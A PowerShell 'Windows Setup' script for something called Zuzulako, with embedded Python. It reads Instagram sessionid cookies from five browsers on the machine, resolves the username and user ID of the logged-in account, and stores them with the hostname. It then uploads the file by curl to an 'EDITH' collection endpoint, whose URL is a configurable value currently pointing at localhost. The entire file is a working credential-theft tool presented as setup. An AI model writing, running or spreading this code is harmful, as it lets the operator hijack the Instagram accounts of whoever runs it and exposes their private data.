# --- CONFIG ---
$EDITH_UPLOAD_URL = "http://localhost:9090/upload"

# --- DETECT INFO ---
$OS_NAME = "Windows"
$MACHINE = $env:COMPUTERNAME
$SESSION_FILE = "session_store.json"
$SESSION_PATH = Join-Path (Get-Location) $SESSION_FILE

# --- INSTALL DEPS ---
Write-Host "[*] Zuzulako - Windows Setup"
Write-Host "[*] Installing dependencies..."
pip install browser-cookie3 requests
if ($LASTEXITCODE -ne 0) {
    pip3 install browser-cookie3 requests
}
Write-Host "[+] Dependencies installed."

# --- PYTHON SCRIPT (inline) ---
Write-Host "[*] Running session extraction..."

$pythonCode = @"
import browser_cookie3
import requests
import json
import os
import platform
import socket

SESSION_FILE = "session_store.json"

def get_session_id():
    system = platform.system()
    browsers = {
        "chrome": browser_cookie3.chrome,
        "firefox": browser_cookie3.firefox,
        "brave": browser_cookie3.brave,
        "edge": browser_cookie3.edge,
        "opera": browser_cookie3.opera,
    }
    found = []
    for browser_name, browser_fn in browsers.items():
        try:
            cookies = browser_fn(domain_name=".instagram.com")
            for c in cookies:
                if c.name == "sessionid":
                    print(f"[+] Found sessionid in {browser_name} ({system})")
                    found.append({"browser": browser_name, "sessionid": c.value})
                    break
        except Exception:
            pass
    if not found:
        print("[-] No Instagram session found in any browser.")
        exit(1)
    if len(found) > 1:
        print(f"[!] Multiple sessions found: {[f['browser'] for f in found]}")
        print(f"[~] Using: {found[0]['browser']}")
    return found[0]["sessionid"], found[0]["browser"], system

def get_username(session_id):
    try:
        headers = {
            "cookie": f"sessionid={session_id}",
            "x-ig-app-id": "936619743392459",
            "user-agent": "Mozilla/5.0"
        }
        r = requests.get(
            "https://www.instagram.com/api/v1/accounts/current_user/?edit=true",
            headers=headers, timeout=10
        )
        data = r.json()
        return data["user"]["username"], str(data["user"]["pk"])
    except Exception:
        return None, None

def save_session(session_id, browser, system, username, user_id):
    store = {}
    if os.path.exists(SESSION_FILE):
        with open(SESSION_FILE) as f:
            store = json.load(f)
    machine = socket.gethostname()
    key = username if username else f"{machine}_{browser}"
    store[key] = {
        "username": username if username else None,
        "user_id": user_id if user_id else None,
        "sessionid": session_id,
        "browser": browser,
        "os": system,
        "machine": machine
    }
    with open(SESSION_FILE, "w") as f:
        json.dump(store, f, indent=2)
    print(f"[+] Session saved -> key: '{key}' | machine: {machine} | browser: {browser} | os: {system}")

session_id, browser, system = get_session_id()
username, user_id = get_username(session_id)
if username:
    print(f"[+] Instagram account: @{username} (ID: {user_id})")
else:
    print("[!] Could not resolve username - saving with machine/browser info.")
save_session(session_id, browser, system, username, user_id)
"@

$pythonCode | python

# --- UPLOAD TO EDITH ---
Write-Host "[*] Uploading session to EDITH..."
$LABEL = "$MACHINE ($OS_NAME)"

curl.exe -X POST `
  -F "file=@$SESSION_PATH" `
  -F "message=$LABEL" `
  -F "os_name=$OS_NAME" `
  $EDITH_UPLOAD_URL

Write-Host ""
Write-Host "[+] Done. Session uploaded to EDITH."
